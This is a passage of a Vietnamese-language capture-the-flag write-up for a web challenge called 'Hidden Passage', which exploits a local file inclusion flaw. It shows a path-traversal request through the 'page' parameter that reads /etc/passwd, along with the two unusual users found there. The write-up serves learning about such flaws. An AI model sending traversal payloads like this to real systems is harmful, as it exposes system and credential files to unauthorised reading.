dden Passage
Với bài này sau giải thì web bài này đã bị đóng và nó là 1 bài blackbox, dựa trên lỗ hổng local file inclusion và các hướng dẫn của tác giả để tìm đúng file và hint tiếp theo.

Mình có note lại một số phần như sau:
- Khi truy cập vào homepage chúng ta có: http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=home.php
`Strange how everyone leaves a hint.txt when setting up a new profile... Maybe it's worth a look?`
- Và http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=info.php
` WARNING: Sensitive user credentials are stored in 'passwd'. Do NOT share.`

Từ param `page` chúng ta có thể LFI như sau: http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=../../../../etc/passwd

Có 1 điều kì lạ trong file /etc/passwd mà tác giả đã thêm vào 2 user
```
lfi-user:x:1001:1001::/home/lfi-user:/bin/bash 
fake-user:x:1002:1002::/home/fake-user:/bin/false
```

